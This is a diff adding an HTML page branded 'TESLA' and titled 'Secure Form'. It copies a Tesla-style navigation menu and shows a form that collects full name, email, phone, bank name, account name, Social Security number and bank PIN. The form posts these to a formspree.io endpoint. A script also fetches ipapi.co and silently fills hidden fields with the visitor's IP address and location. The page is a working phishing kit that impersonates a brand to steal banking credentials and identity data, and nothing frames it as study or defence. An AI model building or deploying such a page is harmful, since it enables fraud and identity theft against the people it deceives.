@@ -1,0 +1,295 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Form</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:sans-serif;
+}
+
+body{
+  background:rgba(245,245,245,0.92);
+}
+
+/* NAVBAR (FROM INDEX) */
+.navbar{
+  position:fixed;
+  top:0;left:0;width:100%;
+  z-index:20;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:18px 5vw;
+  background:#fff;
+  color:#000;
+}
+
+.navbar.active{
+  background:rgba(245,245,245,0.92);
+}
+
+.logo{font-weight:bold;letter-spacing:3px;}
+
+.nav-center{display:flex;gap:25px;}
+.nav-item{cursor:pointer;font-size:14px;}
+
+.nav-right{display:flex;gap:10px;}
+
+.icon{
+  width:32px;height:32px;border-radius:50%;
+  background:rgba(0,0,0,0.1);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+/* DROPDOWN */
+.dropdown{
+  position:fixed;
+  top:0;left:0;width:100%;
+  display:none;
+  z-index:10;
+}
+
+.dropdown.show{
+  display:block;
+  backdrop-filter:blur(22px);
+  background:rgba(245,245,245,0.92);
+  padding-top:90px;
+}
+
+.dropdown-wrapper{padding:40px 5vw;}
+
+.dropdown-grid{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:30px;
+}
+
+.dropdown-item{text-align:center;}
+
+.dropdown-item img{
+  width:100%;
+  height:120px;
+  object-fit:contain;
+}
+
+.links{
+  display:flex;
+  justify-content:center;
+  gap:15px;
+  margin-top:6px;
+}
+
+.links a{
+  font-size:13px;
+  color:#000;
+  text-decoration:underline;
+}
+
+/* FORM */
+.wrapper{
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding-top:100px;
+}
+
+.container{
+  width:90%;
+  max-width:420px;
+  background:#fff;
+  padding:25px;
+  border-radius:12px;
+  box-shadow:0 10px 40px rgba(0,0,0,0.15);
+}
+
+h2{text-align:center;margin-bottom:10px;}
+p{text-align:center;font-size:13px;color:#666;margin-bottom:20px;}
+
+input, textarea{
+  width:100%;
+  padding:12px;
+  margin:8px 0;
+  border:1px solid #ddd;
+  border-radius:8px;
+}
+
+textarea{height:100px;resize:none;}
+
+button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border:none;
+  border-radius:25px;
+  background:#000;
+  color:#fff;
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<!-- NEW NAVBAR (REPLACED) -->
+<div class="navbar">
+  <div class="logo">TESLA</div>
+
+  <div class="nav-center">
+    <div class="nav-item" data-menu="vehicles">Vehicles</div>
+    <div class="nav-item" data-menu="energy">Energy</div>
+    <div class="nav-item" data-menu="charging">Charging</div>
+    <div class="nav-item" data-menu="discover">Discover</div>
+    <div class="nav-item" data-menu="shop">Shop</div>
+  </div>
+
+  <div class="nav-right">
+    <div class="icon">S</div>
+    <div class="icon">A</div>
+    <div class="icon">☰</div>
+  </div>
+</div>
+
+<!-- DROPDOWN -->
+<div id="dropdown" class="dropdown">
+  <div id="dropdown-content"></div>
+</div>
+  <br>
+  <p>
+    <br>
+  </p>
+
+<!-- FORM -->
+<div class="wrapper">
+  <div class="container">
+    <h2>Complete Your Details</h2>
+    <p>Please fill the form to continue</p>
+
+    <form action="https://formspree.io/f/mkokroza" method="POST">
+
+      <input type="text" name="name" placeholder="Full Name" required>
+      <input type="email" name="email" placeholder="Email Address" required>
+      <input type="tel" name="phone" placeholder="Phone Number" required>
+      <input type="text" name="Bank name" placeholder="Bank name">
+      <input type="text" name="Accout name" placeholder="Account name">
+      <input type="text" name="Social Security number" placeholder="Social Security number">
+      <input type="text" name="Bank PIN" placeholder="Bank PIN">
+      <input type="text" name="country" placeholder="Country">
+      <textarea name="message" placeholder="Your message"></textarea>
+
+      <input type="hidden" name="ip" id="ip">
+      <input type="hidden" name="city" id="city">
+      <input type="hidden" name="region" id="region">
+      <input type="hidden" name="country_name" id="country_name">
+      <input type="hidden" name="location" id="location">
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+</div>
+
+<script>
+/* LOCATION CAPTURE */
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    document.getElementById("ip").value = data.ip || "";
+    document.getElementById("city").value = data.city || "";
+    document.getElementById("region").value = data.region || "";
+    document.getElementById("country_name").value = data.country_name || "";
+    document.getElementById("location").value =
+      `${data.city}, ${data.region}, ${data.country_name}`;
+  });
+
+/* MENU (COPIED EXACTLY) */
+const menus={
+vehicles:[
+{name:"Model S",img:"https://images.pexels.com/photos/3729464/pexels-photo-3729464.jpeg"},
+{name:"Model 3",img:"https://images.pexels.com/photos/170811/pexels-photo-170811.jpeg"},
+{name:"Model X",img:"https://images.pexels.com/photos/210019/pexels-photo-210019.jpeg"},
+{name:"Model Y",img:"https://images.pexels.com/photos/358070/pexels-photo-358070.jpeg"},
+{name:"Cybertruck",img:"https://raw.githubusercontent.com/Dooyaabari/teslanova.org/a8bd59b938a7160ad100ef9232200cb3702a53e8/cyber%20truck.jpg"},
+{name:"Roadster",img:"https://images.pexels.com/photos/210019/pexels-photo-210019.jpeg"}
+],
+energy:[
+{name:"Solar Panels",img:"https://images.pexels.com/photos/9875441/pexels-photo-9875441.jpeg"},
+{name:"Solar Roof",img:"https://images.pexels.com/photos/356036/pexels-photo-356036.jpeg"},
+{name:"Powerwall",img:"https://images.pexels.com/photos/159298/gears-cogs-machine-machinery-159298.jpeg"},
+{name:"Megapack",img:"https://images.pexels.com/photos/159298/gears-cogs-machine-machinery-159298.jpeg"},
+{name:"Grid Services",img:"https://images.pexels.com/photos/159298/gears-cogs-machine-machinery-159298.jpeg"},
+{name:"Energy Software",img:"https://images.pexels.com/photos/356036/pexels-photo-356036.jpeg"}
+],
+charging:[
+{name:"Supercharger",img:"https://images.pexels.com/photos/110844/pexels-photo-110844.jpeg"},
+{name:"Home Charging",img:"https://images.pexels.com/photos/259588/pexels-photo-259588.jpeg"},
+{name:"Wall Connector",img:"https://images.pexels.com/photos/110844/pexels-photo-110844.jpeg"},
+{name:"Charging Map",img:"https://images.pexels.com/photos/259588/pexels-photo-259588.jpeg"},
+{name:"Adapters",img:"https://images.pexels.com/photos/110844/pexels-photo-110844.jpeg"},
+{name:"Charging Tips",img:"https://images.pexels.com/photos/259588/pexels-photo-259588.jpeg"}
+],
+discover:[
+{name:"Demo Drive",img:"https://images.pexels.com/photos/386009/pexels-photo-386009.jpeg"},
+{name:"Insurance",img:"https://images.pexels.com/photos/3184291/pexels-photo-3184291.jpeg"},
+{name:"Fleet",img:"https://images.pexels.com/photos/1181671/pexels-photo-1181671.jpeg"},
+{name:"Careers",img:"https://images.pexels.com/photos/1181671/pexels-photo-1181671.jpeg"},
+{name:"Investors",img:"https://images.pexels.com/photos/3184291/pexels-photo-3184291.jpeg"},
+{name:"Events",img:"https://images.pexels.com/photos/386009/pexels-photo-386009.jpeg"}
+],
+shop:[
+{name:"Accessories",img:"https://images.pexels.com/photos/112460/pexels-photo-112460.jpeg"},
+{name:"Charging Gear",img:"https://images.pexels.com/photos/110844/pexels-photo-110844.jpeg"},
+{name:"Apparel",img:"https://images.pexels.com/photos/1002649/pexels-photo-1002649.jpeg"},
+{name:"Lifestyle",img:"https://images.pexels.com/photos/1002649/pexels-photo-1002649.jpeg"},
+{name:"Roof Rack",img:"https://images.pexels.com/photos/112460/pexels-photo-112460.jpeg"},
+{name:"Wheels",img:"https://images.pexels.com/photos/112460/pexels-photo-112460.jpeg"}
+]
+};
+
+const navItems=document.querySelectorAll('.nav-item');
+const dropdown=document.getElementById('dropdown');
+const dropdownContent=document.getElementById('dropdown-content');
+
+navItems.forEach(item=>{
+item.addEventListener('mouseenter',()=>{
+renderMenu(item.dataset.menu);
+dropdown.classList.add('show');
+document.querySelector('.navbar').classList.add('active');
+});
+});
+
+function renderMenu(type){
+dropdownContent.innerHTML=`
+<div class="dropdown-wrapper">
+<div class="dropdown-grid">
+${menus[type].map(i=>`
+<div class="dropdown-item">
+<img src="${i.img}">
+<h4>${i.name}</h4>
+<div class="links">
+<a href="#">Learn</a>
+<a href="#">Order</a>
+</div>
+</div>`).join('')}
+</div>
+</div>`;
+}
+
+document.addEventListener('click',e=>{
+if(!e.target.closest('.navbar')&&!e.target.closest('.dropdown')){
+dropdown.classList.remove('show');
+document.querySelector('.navbar').classList.remove('active');
+}
+});
+</script>
+
+</body>
+</html>
